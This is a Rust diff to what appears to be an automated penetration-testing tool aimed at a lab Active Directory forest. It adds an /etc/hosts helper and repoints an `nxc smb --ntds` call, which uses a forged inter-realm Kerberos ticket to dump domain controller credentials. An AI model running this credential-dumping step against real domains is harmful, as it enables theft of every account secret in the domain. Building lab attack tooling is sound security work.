@@ -12,6 +12,42 @@ use crate::ToolOutput;
 /// inter-realm TGT. See `forge_inter_realm_and_dump` for why this exists.
 const CROSS_REALM_TGS_HELPER: &str = include_str!("cross_realm_tgs.py");
 
+/// Idempotently ensure `/etc/hosts` contains an `<ip> <hostname>` mapping so
+/// callers using FQDNs (Kerberos SPN match) can resolve them on a worker that
+/// has no DNS path to the lab forest. Reads the current file, returns Ok if
+/// any line already maps the hostname to the given IP, otherwise appends a
+/// new entry. The append is racy across concurrent runs but a duplicate line
+/// is harmless and `getaddrinfo` returns the first match, so we don't lock.
+///
+/// Errors are surfaced — failing to write `/etc/hosts` would leave the caller
+/// to silently fail at `nxc` time, which is exactly the symptom we're fixing.
+fn ensure_hosts_entry(ip: &str, hostname: &str) -> Result<()> {
+    use std::io::Write as _;
+    let path = "/etc/hosts";
+    let current = std::fs::read_to_string(path)
+        .with_context(|| format!("failed to read {path} for hostname mapping"))?;
+    let needle = format!(" {hostname} ");
+    let needle_eol = format!(" {hostname}\n");
+    for line in current.lines() {
+        if line.trim_start().starts_with('#') {
+            continue;
+        }
+        let padded = format!(" {line} \n");
+        if padded.contains(&needle) || padded.contains(&needle_eol) {
+            let mut fields = line.split_whitespace();
+            if fields.next() == Some(ip) && fields.any(|f| f.eq_ignore_ascii_case(hostname)) {
+                return Ok(());
+            }
+        }
+    }
+    let mut f = std::fs::OpenOptions::new()
+        .append(true)
+        .open(path)
+        .with_context(|| format!("failed to open {path} for hostname mapping"))?;
+    writeln!(f, "{ip} {hostname}").with_context(|| format!("failed to append to {path}"))?;
+    Ok(())
+}
+
 /// Extract trust keys by dumping secrets for a trusted domain's machine account.
 ///
 /// Required args: `domain`, `username`, `dc_ip`, `trusted_domain`
@@ -229,10 +265,27 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
     }
 
     // --- Step 3: nxc smb --ntds via the TGS ccache ---
-    let nxc_host = dc_ip.unwrap_or(target);
+    //
+    // The cached TGS is bound to `cifs/{target}` where `target` is the FQDN
+    // baked into the ticket by step 2. nxc auto-builds its SPN from the
+    // command-line target, so we MUST pass the FQDN here — passing the IP
+    // would make nxc look up `cifs/<IP>` in the cache, miss, and silently
+    // fall through with exit 0 / empty stdout.
+    //
+    // FQDN connect requires DNS, but on a stock Kali worker `/etc/resolv.conf`
+    // points at AWS internal DNS which does not know the lab forest. Without
+    // a hosts entry the socket-layer lookup fails before nxc can speak SMB,
+    // and the same silent exit-0 failure mode shows up — masking real auth
+    // outcomes from the orchestrator's krbtgt-observation check. Append an
+    // `<ip> <fqdn>` line to `/etc/hosts` (the worker runs as root) so getaddrinfo
+    // resolves cleanly. The append is idempotent — duplicate lines are harmless
+    // and survive concurrent runs without locking.
+    if let Some(ip) = dc_ip {
+        ensure_hosts_entry(ip, target)?;
+    }
     let dump_output = CommandBuilder::new("nxc")
         .arg("smb")
-        .arg(nxc_host)
+        .arg(target)
         .arg("-k")
         .arg("--use-kcache")
         .arg("--ntds")
